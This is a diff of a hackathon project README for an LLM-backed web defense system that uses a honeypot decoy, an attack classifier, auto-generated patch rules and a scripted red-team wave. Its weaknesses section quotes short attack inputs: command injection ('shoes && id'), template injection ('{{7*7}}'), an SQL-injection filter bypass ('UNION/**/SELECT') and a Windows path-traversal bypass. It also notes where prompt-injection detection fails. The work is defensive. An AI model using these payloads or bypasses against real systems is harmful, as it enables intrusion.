+- **Decoy** (`:8300`): the same four endpoints, answered by Qwen; session from `?cs=`, the `X-Chameleon-Session` header, or a cookie.
+- **Demo apps** (`:8200`): the same four endpoints plus `GET /patches` (the code patches each app has loaded).
+- **Check model** (`:8010`): `GET /health`, `POST /check {"inputs": [...]}` → `{"malicious", "score", "worst_input_index", "latency_ms"}`.
+- **Dashboard API** (`:8100`): `POST /api/try` (one request through the real path, as the dashboard sends it), `GET /api/summary|requests|sessions|patches|patch-jobs|patch-store|llm_calls|infra|honeytokens/latest`, `GET /api/compare` + `POST /api/compare/mode` (Nano vs AWS), `POST /api/scenario/start` + `GET /api/scenario/status` (attack wave), `POST /api/demo/reset`, `POST /api/redis/clear`, `WS /ws`.
 
-The dashboard has three panels: **PAYLOAD_INJECTOR** (a terminal plus attack presets), the target app **as the attacker sees it**, with an operator-only strip revealing whether the honeypot or the real app answered, and **ACTIVE_DEFENSE_RULES** (the Nano-trained classifier, every approved auto-patch, and each patch's full writer → tests → verifier trail).
+## Repository map
+
+| Path | What's there |
+|---|---|
+| `chameleon/gateway/`, `router.py`, `fusion.py` | Front door, routing, decision fusion |
+| `chameleon/jev/` | Jev client (Vercel AI Gateway or TypeSafe API) |
+| `chameleon/check/` | Check model: dataset, training, serving |
+| `chameleon/decoy/`, `honeypot/` | Decoy app, persona prompt, honeytokens, sessions |
+| `chameleon/autopatch.py`, `patch/` | Patch jobs, writer, tests, verifier, pipeline, Redis store, code rendering |
+| `chameleon/apps/`, `demoapp/` | The four demo apps with their AUTO-PATCHES blocks |
+| `chameleon/cloud_mirror.py` | Nano vs AWS Bedrock measurement |
+| `chameleon/api/`, `dashboard/` | Dashboard backend and single-file UI |
+| `chameleon/redteam/` | Scripted attack wave |
+| `training/` | LoRA data generation, training, evaluation, upload |
+| `results/`, `docs/` | Raw measurements; PDFs, methodology, CloudWatch layout |
+| `tests/` | 110 unit tests (pytest, fakeredis) |
 
 ## Safety boundaries
 
-- No real user data anywhere in the demo — products, accounts, and files are all fabricated, and canary tokens make a leak detectable immediately.
-- The "attacker" in every demo/benchmark run is our own red-team script (`chameleon/redteam/scenario.py`), never a real attack against anything outside this project.
-- The Nano is never exposed to the public internet; model servers are localhost-only.
-- We never claim the Nano can only run one model at a time — false, and something HP judges would catch; the honest reason Jev's check runs in the cloud is that Jev is offered only as a hosted API.
+- No real user data anywhere: products, accounts and files are fabricated, and canary tokens make any leak detectable.
+- The only "attacker" is our own red-team script and our own test requests, never anything outside this project.
+- Services are localhost-only; the Nano is not exposed to the internet.
+- Keys live in git-ignored `.env` / `.env.local`; the AWS key is least-privilege (Bedrock invoke plus read-only CloudWatch).
 
-## Limitations (current status)
+## Status and known limitations
 
-- [x] Check model trained + served on the Nano
-- [x] Honeypot, patch writer, verifier, and patch pipeline (4 deterministic tests + accountable verifier), all live on real models
-- [x] Front door (fusion of Nano check + Jev + approved rules), orchestrator, backend API, live dashboard
-- [x] Red-team scenario closing the loop live: 0% → 78% on a never-seen attack type
-- [x] LoRA fine-tune on the Nano, evaluated on held-out attack types, published to Hugging Face
-- [x] Benchmarks with both LLMs serving side by side
-- [x] Gateway on :8000: proxies safe traffic, 307-redirects attacks to the decoy app, 403s stolen honeytokens and patched attacks
-- [x] Decoy app on the Nano (:8300), every answer written by Qwen
-- [x] Redis patch store; approved patches rendered as Python into the four demo apps
-- [x] Jev live through Vercel AI Gateway (`typesafe-ai/jev`, key `AI_GATEWAY_API_KEY` in `.env.local`), ~260-650 ms per request. In a live run of 13 real requests it caught 5 attacks the Nano model missed (command injection x2, path traversal x2, SSRF)
-- [ ] The fine-tuned 7B isn't yet the default writer in production. It's evaluated and published, but serving it needs the backend-socket route (`llm.timed_call(uds=...)`), because ZRT's proxy doesn't route LoRA adapters
+- [x] Check model, decoy, patch writer, verifier and pipeline, live on real models
+- [x] Gateway, decoy app, honeytokens and stolen-credential detection
+- [x] Jev live through Vercel AI Gateway, with the Nano as fallback
+- [x] Redis patch store; patches rendered as Python into the four apps
+- [x] Nano vs AWS Bedrock comparison, cross-checked against CloudWatch
+- [x] LoRA fine-tune on the Nano, evaluated and published
+- [ ] The fine-tuned 7B isn't the production writer yet (ZRT's proxy doesn't route LoRA adapters; it needs the backend-socket route)
+- [ ] The verifier isn't NVFP4 yet (see Benchmarks)
 
 **Known weaknesses, measured:**
-- Jev false positive seen live: "Please ignore my last message, I meant order #4417" scored 0.69 and went to the decoy. It doesn't catch `{{7*7}}` (0.29).
-- A learned command-injection rule once blocked any `;` or `|`, so real searches like "Tom & Jerry DVD; season 1" got a 403. The random sample of normal traffic had no such characters. The normal-traffic test now always includes realistic inputs that use the characters attacks use (`autopatch.HARD_NEGATIVES`); the rule was rolled back and re-learned.
-- Regex rules generalize well to structured attacks and poorly to natural-language ones. In the fine-tune data, teacher rules reached a median 80% recall on unseen SQLi but only 6% on unseen prompt injection. That's why prompt injection relies on the trained classifier and the honeypot, not on patches.
-- The approved path-traversal rule has one recorded known bypass: Windows-style backslash paths (`..\..\`). The pipeline logged it as a known gap rather than hiding it.
-- The fine-tuned 7B gets stuck in repetition loops on about a third of outputs.
-- Prompt injection: 8 of 10 caught in the live run, not 10.
-- Everything here comes from one day, one Nano, and public/synthetic data. None of it describes enterprise-scale performance.
+- Some attacks pass both checks: `shoes && id` (Jev 0.27, Nano 0.45) and `{{7*7}}` (Jev 0.29).
+- Jev sent one real customer message ("Please ignore my last message, I meant order #4417", 0.69) to the decoy.
+- A learned rule once blocked any `;` or `|`, so "Tom & Jerry DVD; season 1" got a 403. The normal-traffic test now always includes such inputs, and the rule was rolled back and re-learned.
+- Some approved patches carry a known bypass that Gemma found (for example `UNION/**/SELECT`); it's recorded on the patch as `approved_with_known_issues`, not hidden.
+- Regex rules generalize well to structured attacks and poorly to natural-language ones, so prompt injection relies mainly on the classifiers and the decoy.
+- Decoy replies that invent a whole file can take up to 25 s; the 307 redirect reveals a different port to a careful attacker.
+- One day, one Nano, public and synthetic data: none of this describes enterprise-scale performance.
 
 ## References
 
@@ -217,8 +254,8 @@ The dashboard has three panels: **PAYLOAD_INJECTOR** (a terminal plus attack pre
   - [Cybercriminals leaning into agentic AI](https://www.hp.com/us-en/newsroom/press-releases/2026/hp-research-cybercriminals-leaning-into-agentic-ai-momentum-to-steal-crypto-wallets.html)
   - [HP Wolf Security Threat Insights Report, September 2026](https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-september-2026/)
 - [Unit 42: indirect prompt injection in the wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
-- Datasets: [HttpParamsDataset](https://github.com/Morzeux/HttpParamsDataset) (MIT), [deepset/prompt-injections](https://huggingface.co/datasets/deepset/prompt-injections), [jackhhao/jailbreak-classification](https://huggingface.co/datasets/jackhhao/jailbreak-classification)
+- [TypeSafe Jev](https://docs.typesafe.ai/introduction/quickstart) · [Vercel AI Gateway](https://vercel.com/docs/ai-gateway/sdks-and-apis/ai-sdk)
 
 ## Team
 
-HP Edge AI SJSUHack, Secure AI track. Full design history and every decision's rationale: `HANDOFF.md`.
+HP Edge AI SJSUHack, Secure AI track: Yukta Vajpayee, Karthik Pragada, Poushali Deb Purkayastha, Garvit Sharma, Arpana Singh. Full design history and every decision's rationale: `HANDOFF.md`.
